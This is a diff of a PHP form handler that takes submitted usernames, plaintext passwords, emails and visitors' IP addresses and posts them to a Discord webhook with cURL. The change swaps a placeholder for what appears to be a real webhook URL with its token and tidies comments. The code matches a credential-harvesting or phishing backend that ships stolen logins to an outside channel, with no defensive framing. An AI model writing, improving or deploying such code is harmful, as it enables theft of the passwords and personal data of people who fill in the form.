@@ -3,12 +3,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
     $email = $_POST['email'];
-    $additional_info = $_POST['additional_info'];
+    $additional_info = isset($_POST['additional_info']) ? $_POST['additional_info'] : null;
 
     // Get IP address
     $ip_address = $_SERVER['REMOTE_ADDR'];
 
-    // Prepare data to send to Discord bot
+    // Prepare data to send to Discord webhook
     $data = [
         'username' => $username,
         'password' => $password,
@@ -20,10 +20,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Convert data to JSON format
     $json_data = json_encode($data);
 
-    // URL of your Discord bot webhook
-    $webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE";
+    // URL of your Discord webhook
+    $webhook_url = "https://discord.com/api/webhooks/1558964430836990175/RnRA4zY8n88DU_GAy6V4624zovlkm3Hj6rQSxOmz_Z3xLJUSjqLVa_ie-m198jW5Av02"; // Replace with the actual webhook URL
 
-    // Use cURL to send data to the Discord bot
+    // Use cURL to send data to the Discord webhook
     $ch = curl_init($webhook_url);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ['payload_json' => $json_data]);
